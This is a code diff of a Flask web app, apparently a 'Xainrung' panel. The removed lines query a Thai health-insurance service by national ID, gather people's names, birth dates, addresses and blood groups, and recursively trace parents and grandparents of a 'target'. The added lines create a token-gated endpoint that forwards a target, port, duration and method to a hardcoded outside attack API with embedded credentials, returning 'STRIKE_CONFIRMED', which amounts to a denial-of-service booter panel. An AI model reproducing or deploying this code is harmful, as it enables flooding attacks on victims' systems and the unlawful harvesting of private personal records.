-        pid, role, level = queue.pop(0)
-        if pid in visited or not pid or len(str(pid)) != 13 or str(pid) == '0'*13: continue
-        visited.add(pid)
+@app.route('/api/verify', methods=['POST'])
+def verify():
+    token = request.json.get('token')
+    if token in valid_tokens and time.time() < valid_tokens[token]:
+        session['logged_in'] = True
+        return jsonify({"status": "success"})
+    return jsonify({"status": "error"})
+
+@app.route('/api/check_session')
+def check_session():
+    return jsonify({"logged_in": session.get('logged_in', False)})
+
+@app.route('/api/launch', methods=['POST'])
+def launch():
+    if not session.get('logged_in'):
+        return jsonify({"status": "error", "message": "UNAUTHORIZED_ACCESS"})
         
-        res = nhso_client.search_by_pid(pid)
-        if res.get('success'):
-            p = res['data'].get("personData", {})
-            if p:
-                fullname = p.get('fullName', '-')
-                names = fullname.split()
-                firstname = names[0] if names else "เป้าหมาย"
-                h = p.get('homeAddress', {}); c = p.get('addressCatm', {})
-                f_id = str(p.get('fatherPid', p.get('fatherId', '0000000000000')))
-                m_id = str(p.get('motherPid', p.get('motherId', '0000000000000')))
+    data = request.json
+    target = data.get('target')
+    port = data.get('port')
+    time_val = data.get('time')
+    method = data.get('method')
 
-                final_results.append({
-                    "role": role, "pid": pid, "name": fullname,
-                    "gender": "ชาย" if "นาย" in fullname or "ด.ช." in fullname else "หญิง" if "นาง" in fullname or "น.ส." in fullname or "ด.ญ." in fullname else "ไม่ระบุ",
-                    "birth": p.get('displayBirthDate', '-'),
-                    "religion": "พุทธ", "blood": p.get('bloodGroup', 'O'), "job": "รับจ้างทั่วไป",
-                    "addr": f"บ้านเลขที่ {h.get('adressNo','-')} หมู่ที่ {h.get('moo','00')} ตำบล{c.get('tumbonName','-')} อำเภอ{c.get('amphurName','-')} จังหวัด{c.get('changwatName','-')}",
-                    "father_id": f_id if f_id != '0000000000000' else "0", 
-                    "mother_id": m_id if m_id != '0000000000000' else "0"
-                })
+    api_url = f"http://84.21.173.208:7575/api/attack?username=Xaingrung&password=Xaingrung&target={target}&port={port}&time={time_val}&method={method}"
+    
+    try:
+        response = requests.get(api_url, timeout=10)
+        if response.status_code == 200:
+            return jsonify({"status": "success", "message": "STRIKE_CONFIRMED"})
+        else:
+            return jsonify({"status": "error", "message": f"ERROR_{response.status_code}"})
+    except Exception as e:
+        return jsonify({"status": "error", "message": str(e)})
 
-                # ระบบค้นหาลำดับญาติเชิงลึก
-                if level < 2:
-                    if level == 0:
-                        f_role, m_role = (f"บิดา ของ {firstname}", f"มารดา ของ {firstname}")
-                    elif level == 1:
-                        if "บิดา" in role:
-                            f_role, m_role = (f"ปู่ ของเป้าหมายหลัก (บิดาของ {firstname})", f"ย่า ของเป้าหมายหลัก (มารดาของ {firstname})")
-                        else:
-                            f_role, m_role = (f"ตา ของเป้าหมายหลัก (บิดาของ {firstname})", f"ยาย ของเป้าหมายหลัก (มารดาของ {firstname})")
-
-                    if len(f_id) == 13 and f_id.isdigit() and f_id != '0'*13: 
-                        queue.append((f_id, f_role, level + 1))
-                    if len(m_id) == 13 and m_id.isdigit() and m_id != '0'*13: 
-                        queue.append((m_id, m_role, level + 1))
-                
-    return jsonify({"results": final_results})
-
-@app.route('/adminxaingrung', methods=['GET', 'POST'])
-def admin():
-    if request.args.get('pw') != ADMIN_PASSWORD: return "Forbidden", 403
-    tk = "AUTH-" + secrets.token_hex(4).upper()
-    tokens_db[tk] = datetime.now() + timedelta(hours=24)
-    return f"Token: {tk}"
-
-if __name__ == "__main__":
-    app.run(host='0.0.0.0', port=5000)
+if __name__ == '__main__':
+    print("XAINRUNG ADVANCED PANEL WITH TOKEN SYSTEM IS STARTING...")
+    app.run(host='0.0.0.0', port=5000, debug=True)
